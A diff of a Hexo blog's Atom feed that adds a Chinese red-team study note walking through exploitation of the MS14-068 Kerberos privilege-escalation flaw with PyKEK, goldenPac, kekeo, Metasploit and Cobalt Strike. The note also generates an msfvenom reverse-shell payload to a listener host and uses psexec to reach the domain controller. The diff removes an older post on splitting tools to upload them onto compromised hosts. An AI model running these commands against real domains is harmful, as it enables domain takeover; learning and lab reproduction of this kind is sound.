@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-09-23T07:16:26.268Z</updated>
+  <updated>2021-09-24T02:20:57.661Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
+    <link href="https://www.teamssix.com/210924-100520.html"/>
+    <id>https://www.teamssix.com/210924-100520.html</id>
+    <published>2021-09-24T02:05:20.000Z</published>
+    <updated>2021-09-24T02:20:57.661Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231733653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231746641.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109240943968.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109241000974.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a></p><p><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-632</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Kerberos 协议详解与利用</title>
@@ -35,12 +57,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -63,12 +79,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -93,12 +103,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -120,12 +124,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -149,12 +147,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -176,12 +168,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -205,12 +191,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -232,12 +212,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -261,12 +235,6 @@
     <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
     
     
-    <category term="RCE" scheme="https://www.teamssix.com/tags/RCE/"/>
-    
-    <category term="防御" scheme="https://www.teamssix.com/tags/%E9%98%B2%E5%BE%A1/"/>
-    
-    <category term="反制" scheme="https://www.teamssix.com/tags/%E5%8F%8D%E5%88%B6/"/>
-    
   </entry>
   
   <entry>
@@ -288,12 +256,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -317,12 +279,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -344,12 +300,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -373,12 +323,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -400,12 +344,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
@@ -429,12 +367,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -456,12 +388,6 @@
     
     <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
-    
-    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
-    
-    <category term="Windows" scheme="https://www.teamssix.com/tags/Windows/"/>
     
   </entry>
   
@@ -485,12 +411,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -513,12 +433,6 @@
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
   </entry>
   
   <entry>
@@ -540,41 +454,6 @@
     
     <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
-    <link href="https://www.teamssix.com/210630-113201.html"/>
-    <id>https://www.teamssix.com/210630-113201.html</id>
-    <published>2021-06-30T03:32:01.000Z</published>
-    <updated>2021-09-09T14:45:25.059Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p><p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p><p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p><h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p><p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p><pre class="line-numbers language-none"><code class="language-none">a     添加压缩文件x     解压压缩文件-p    指定密码-v    分卷压缩-r    递归压缩-o    指定输出目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 2794266 bytes (2729 KiB)Extracting archive: fscan.7z--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p><h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p><p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 2C2C-615D C:\7-Zip 的目录2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          .2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          ..2021&#x2F;05&#x2F;06  15:00           489,472 7z.exe2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0012021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0022021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0032021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0042021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0052021&#x2F;06&#x2F;29  21:40           234,266 fscan.7z.0062021&#x2F;06&#x2F;18  14:58         2,911,744 fscan.exe               8 个文件      6,195,482 字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z.001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.0017-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 512000 bytes (500 KiB)Extracting archive: fscan.7z.001--Path &#x3D; fscan.7z.001Type &#x3D; SplitPhysical Size &#x3D; 512000Volumes &#x3D; 6Total Physical Size &#x3D; 2794266----Path &#x3D; fscan.7zSize &#x3D; 2794266--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p><p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p><h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p><pre class="line-numbers language-none"><code class="language-none">split -b 500k fscan.exe teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>合并分割文件为 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">cat teamssix* &gt; fscan# 适用于 Linux、Maccopy &#x2F;b teamssix* fscan.exe# 适用于 Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
-    
-    
-      
-      
